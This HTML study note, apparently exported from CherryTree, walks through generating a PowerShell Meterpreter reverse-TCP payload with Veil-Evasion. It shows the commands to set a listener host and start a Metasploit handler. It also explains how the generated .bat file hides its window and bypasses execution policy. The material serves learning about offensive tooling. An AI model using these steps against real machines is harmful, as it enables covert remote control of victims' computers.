<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>example: understand payload generated</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>example: understand payload generated</h1><br /><span style="color:#a5452a;">Example:</span><br />
    <div class="codebox">
      <div class="codebox">
        root@kali:#&nbsp;use&nbsp;Evasion<br />root@kali:#&nbsp;list<br />root@kali:#&nbsp;use&nbsp;powershell/meterpreter/rev_tcp.py<br />root@kali:#&nbsp;set&nbsp;lhost&nbsp;192.168.1.122<br />root@kali:#&nbsp;generate<br />&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;<span
          style="color:#000000;font-weight:400">&lt;</span>insert-name-to-use-for-the-payload<span
          style="color:#000000;font-weight:400">&gt;</span></div>
    </div><br /> <a href=""><img src="images/1081-1.png" alt="images/1081-1.png" /></a><br /> <span
      style="color:#ff8700;"> /var/lib/veil/output/source/foxConnection.bat</span> → payload file<br /> <span
      style="color:#ff8700;"> /var/lib/veil/output/handlers/foxConnection.rc</span> → Metasploit configuration file
    (also known as a handler file) that we can use with metasploit<br />
    <div class="codebox">
      <div class="codebox">root@kali:#&nbsp;msfconsole&nbsp;-r&nbsp;/var/lib/veil/output/handlers/foxConnection.rc</div>
    </div><br /> <a href=""><img src="images/1081-2.png" alt="images/1081-2.png" /></a><br /> Now Metasploit is now only
    awaiting connection from our malicious payload &quot;foxConnection.bat&quot; from a Windows machine<br /> <br />
    <div class="codebox">
      <div class="codebox">root@kali:#&nbsp;cat&nbsp;/var/lib/veil/output/source/foxConnection.bat</div>
    </div><br /><a href=""><img src="images/1081-3.png" alt="images/1081-3.png" /></a><br /> ◇ <span
      style="color:#f6ff00;">@echo off</span> → turn off the echoing of commands on the screen<br /> ◇ <span
      style="color:#a020f0;">if %PROCESSOR_ARCHITECTURE%==x86 ... else ...</span> → checks the processor architecture to
    determine which version of PowerShell to invoke (the x86 or the x64 version<br /> ◇ <span
      style="color:#00ff00;">-NoP</span>: short for NoProfile, it prevents PowerShell from loading a profile of custom
    settings<br /> ◇ <span style="color:#0000ff;">-NonI</span>: short for NonInteractive, it prevents PowerShell from
    displaying an interactive prompt to the user on the screen<br /> ◇ <span style="color:#ff00e0;">-W Hidden</span>:
    set the window style of PowerShell to Hidden so that it won&#39;t pop up a PowerShell console on the screen. Note
    that the .bat file that launches PowerShell displays a console, but PowerShell will not.<br /> ◇ <span
      style="color:#0ee491;">-Exec Bypass</span>: this ensures the script will run regardless of the execution policy of
    powershell on the system. Note that Execution Policy was never meant to be a security restriction, rather a way to
    prevent admins from accidentally doing damage.<br /> To see many ways to bypass ExecutionPolicies: <a
      href="https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy" target="_blank">https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy</a>.<br />
    *In this case is not present in the x86 command but i do not know why...to be explored...<br /> ◇ <span
      style="color:#ff0000;">-Command</span>: finally, we have the PowerShell command to be executed<br />
    <br />Bibliography:<br />• <a
      href="https://threat.tevora.com/dissecting-veil-evasion-powershell-payloads-and-converting-to-a-bind-shell/" target="_blank">Dissecting
      Veil-Evasion Powershell Payloads and Converting to a Bind Shell (tevora.com)</a><br />• <a
      href="https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy" target="_blank">https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy</a><br />
  </div>
</body>

</html>